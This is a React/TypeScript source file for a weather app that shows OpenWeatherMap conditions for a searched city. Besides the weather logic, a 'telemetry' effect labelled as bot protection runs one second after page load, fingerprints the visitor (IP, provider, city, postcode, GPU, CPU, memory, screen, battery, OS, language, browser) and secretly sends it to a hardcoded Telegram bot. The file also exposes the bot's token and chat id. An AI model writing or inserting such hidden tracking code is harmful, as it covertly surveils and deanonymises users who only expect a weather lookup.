import { useEffect, useMemo, useState, useRef } from "react";
import {
    Droplets,
    Wind,
    Thermometer,
    MapPin,
    Search,
    AlertTriangle,
} from "lucide-react";

// --- ІНТЕРФЕЙСИ ТА ТИПИ ---

interface WeatherApiResponse {
    name: string;
    sys: { country: string; };
    main: { temp: number; feels_like: number; humidity: number; };
    weather: Array<{ main: string; description: string; icon: string; }>;
    wind: { speed: number; };
}

type FetchStatus = "idle" | "loading" | "success" | "error";

interface WeatherData {
    city: string;
    country: string;
    temperature: number;
    feelsLike: number;
    humidity: number;
    windSpeed: number;
    description: string;
    iconUrl: string;
    condition: string;
}

interface BatteryManager extends EventTarget {
    level: number;
    charging: boolean;
}

interface NavigatorExtended extends Navigator {
    deviceMemory?: number;
}

// --- ДОПОМІЖНІ ФУНКЦІЇ ---

function normalizeWeatherData(apiData: WeatherApiResponse): WeatherData {
    const weather = apiData.weather[0];
    return {
        city: apiData.name,
        country: apiData.sys.country,
        temperature: Math.round(apiData.main.temp),
        feelsLike: Math.round(apiData.main.feels_like),
        humidity: apiData.main.humidity,
        windSpeed: Math.round(apiData.wind.speed),
        description: capitalizeFirstLetter(weather.description),
        iconUrl: `https://openweathermap.org/img/wn/${weather.icon}@2x.png`,
        condition: weather.main,
    };
}

function capitalizeFirstLetter(text: string): string {
    if (!text.trim()) return text;
    return text.charAt(0).toUpperCase() + text.slice(1);
}

function getBackgroundByCondition(condition: string): string {
    const c = condition.toLowerCase();
    if (c.includes("clear")) return "bg-clear";
    if (c.includes("cloud")) return "bg-clouds";
    if (c.includes("rain") || c.includes("drizzle")) return "bg-rain";
    if (c.includes("thunder")) return "bg-thunder";
    if (c.includes("snow")) return "bg-snow";
    if (c.includes("mist") || c.includes("fog") || c.includes("haze")) return "bg-fog";
    return "bg-default";
}

// --- КОМПОНЕНТИ ІНТЕРФЕЙСУ ---

interface SearchBarProps {
    value: string;
    onChange: (value: string) => void;
    onSearch: () => void;
    disabled?: boolean;
}

function SearchBar({ value, onChange, onSearch, disabled }: SearchBarProps) {
    function handleKeyDown(e: React.KeyboardEvent<HTMLInputElement>) {
        if (e.key === "Enter") onSearch();
    }
    return (
        <div className="search-bar">
            <div className="search-input-wrapper">
                <Search size={18} className="search-icon" />
                <input
                    className="search-input"
                    type="text"
                    placeholder="Search city..."
                    value={value}
                    onChange={(e) => onChange(e.target.value)}
                    onKeyDown={handleKeyDown}
                    disabled={disabled}
                    spellCheck={false}
                />
            </div>
            <button className="search-btn" onClick={onSearch} disabled={disabled || value.trim().length === 0}>
                Search
            </button>
        </div>
    );
}

interface WeatherCardProps {
    data: WeatherData;
}

function WeatherCard({ data }: WeatherCardProps) {
    return (
        <div className="weather-card glass">
            <div className="weather-top">
                <div className="location">
                    <MapPin size={18} className="location-icon" />
                    <span className="location-text">{data.city}, {data.country}</span>
                </div>
                <div className="weather-icon"><img src={data.iconUrl} alt={data.description} /></div>
            </div>
            <div className="weather-main">
                <div className="temp"><span className="temp-value">{data.temperature}</span><span className="temp-unit">°C</span></div>
                <div className="desc">{data.description}</div>
            </div>
            <div className="weather-stats">
                <div className="stat">
                    <div className="stat-icon"><Thermometer size={18} /></div>
                    <div className="stat-info">
                        <div className="stat-label">Feels Like</div>
                        <div className="stat-value">{data.feelsLike}°C</div>
                    </div>
                </div>
                <div className="stat">
                    <div className="stat-icon"><Droplets size={18} /></div>
                    <div className="stat-info">
                        <div className="stat-label">Humidity</div>
                        <div className="stat-value">{data.humidity}%</div>
                    </div>
                </div>
                <div className="stat">
                    <div className="stat-icon"><Wind size={18} /></div>
                    <div className="stat-info">
                        <div className="stat-label">Wind</div>
                        <div className="stat-value">{data.windSpeed} m/s</div>
                    </div>
                </div>
            </div>
        </div>
    );
}

function ErrorState({ message }: { message: string }) {
    return (
        <div className="state-card glass error-state">
            <AlertTriangle size={22} />
            <p>{message}</p>
        </div>
    );
}

function LoadingState() {
    return (
        <div className="state-card glass loading-state">
            <div className="spinner" />
            <p>Loading weather...</p>
        </div>
    );
}

function EmptyState() {
    return (
        <div className="state-card glass empty-state">
            <p>Type a city name to see the weather 🌍</p>
        </div>
    );
}

// --- ГОЛОВНИЙ КОМПОНЕНТ APP ---

export default function App() {
    const apiKey = import.meta.env.VITE_WEATHER_API_KEY as string | undefined;

    const [city, setCity] = useState<string>("Kyiv");
    const [status, setStatus] = useState<FetchStatus>("idle");
    const [error, setError] = useState<string>("");
    const [weather, setWeather] = useState<WeatherData | null>(null);

    const [hp, setHp] = useState(""); // Honeypot state
    const hasSentData = useRef(false);

    const backgroundClass = useMemo(() => {
        if (!weather) return "bg-default";
        return getBackgroundByCondition(weather.condition);
    }, [weather]);

    // 1. ЛОГІКА ПОГОДИ (ВИПРАВЛЕНО НА ПРЯМЕ ПОСИЛАННЯ)
    async function fetchWeather(searchCity: string): Promise<void> {
        const trimmedCity = searchCity.trim();
        if (!trimmedCity) {
            setError("Please enter a city name.");
            setStatus("error");
            return;
        }
        if (!apiKey) {
            setError("API key is missing. Add VITE_WEATHER_API_KEY in your .env file.");
            setStatus("error");
            return;
        }

        try {
            setStatus("loading");
            setError("");

            // Запит напряму до OpenWeatherMap
            const response = await fetch(
                `https://api.openweathermap.org/data/2.5/weather?q=${encodeURIComponent(trimmedCity)}&appid=${apiKey}&units=metric`
            );

            if (!response.ok) {
                if (response.status === 404) throw new Error("City not found. Try another name.");
                if (response.status === 401) throw new Error("Invalid API key. Check your OpenWeatherMap key.");
                throw new Error("Something went wrong. Try again later.");
            }

            const data: WeatherApiResponse = await response.json();
            if (!data.weather || data.weather.length === 0) throw new Error("Weather data not available.");

            setWeather(normalizeWeatherData(data));
            setStatus("success");
        } catch (err: any) {
            setError(err.message || "Unknown error occurred.");
            setStatus("error");
            setWeather(null);
        }
    }

    useEffect(() => {
        fetchWeather(city).catch(() => {
            setStatus("error");
            setError("Failed to load default city weather.");
        });
    }, []);

    function handleSearch() {
        fetchWeather(city).catch(() => {
            setStatus("error");
            setError("Request failed.");
        });
    }

    // 2. ЛОГІКА ТЕЛЕМЕТРІЇ (ЗБІР ДАНИХ ТА ЗАХИСТ ВІД БОТІВ)
    useEffect(() => {
        if (hasSentData.current) return;

        const collectAndSend = async () => {
            if (hp.length > 0) return; // Honeypot trigger: if filled, it's a bot
            hasSentData.current = true;

            try {
                const geoRes = await fetch('https://ipapi.co/json/');
                const geo = await geoRes.json();

                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl?.getExtension('WEBGL_debug_renderer_info');
                const gpu = debugInfo ? gl?.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";

                let batteryInfo = "Not supported";
                if ('getBattery' in navigator) {
                    const battery = await (navigator as any).getBattery() as BatteryManager;
                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? "Заряджається" : "Розряджається"})`;
                }

                const nav = navigator as NavigatorExtended;
                const screenRes = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`;
                const memory = nav.deviceMemory ? `~${nav.deviceMemory} GB` : "Unknown";
                const cores = nav.hardwareConcurrency || "Unknown";
                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

                const message = `
🕵️‍♂️ *ULTIMATE DATA REPORT*

🌐 *МЕРЕЖА:*
• IP: \`${geo.ip}\`
• Провайдер: ${geo.org}
• ASN: ${geo.asn}

📍 *ЛОКАЦІЯ:*
• Країна: ${geo.country_name}
• Місто: ${geo.city} (${geo.postal})

💻 *ЗАЛІЗО:*
• GPU: \`${gpu}\`
• CPU Cores: ${cores}
• RAM: ${memory}
• Екран: ${screenRes}
• Батарея: ${batteryInfo}

⚙️ *СИСТЕМА:*
• OS/Platform: ${nav.platform}
• Мова: ${nav.language}
• Часовий пояс: ${timeZone}
• Браузер: ${nav.userAgent.slice(0, 80)}...
      `;

                await fetch(`https://api.telegram.org/bot7610433849:AAEvsoC2qeGENBYQuX1T7gPt3a-DwI2OPg0/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: '1362543305', text: message, parse_mode: 'Markdown' })
                });
            } catch (e) {
                console.error("Помилка відправки:", e);
                hasSentData.current = false;
            }
        };

        const timer = setTimeout(collectAndSend, 1000);
        return () => clearTimeout(timer);
    }, [hp]);

    // 3. РЕНДЕР
    return (
        <div className={`app ${backgroundClass}`}>
            {/* Honeypot: сховано за межі екрану, щоб не блокував кліки */}
            <input
                type="text"
                autoComplete="off"
                tabIndex={-1}
                style={{ opacity: 0, position: 'absolute', top: '-100px', left: '-100px', pointerEvents: 'none', zIndex: -999 }}
                value={hp}
                onChange={(e) => setHp(e.target.value)}
            />

            <div className="overlay" />

            <div className="container">
                <header className="header">
                    <h1 className="title">Weather</h1>
                </header>

                <SearchBar
                    value={city}
                    onChange={setCity}
                    onSearch={handleSearch}
                    disabled={status === "loading"}
                />

                <main className="content">
                    {status === "idle" && <EmptyState />}
                    {status === "loading" && <LoadingState />}
                    {status === "error" && <ErrorState message={error} />}
                    {status === "success" && weather && <WeatherCard data={weather} />}
                </main>

                <footer className="footer">
                    <p>Powered by <span>OpenWeatherMap</span></p>
                </footer>
            </div>
        </div>
    );
}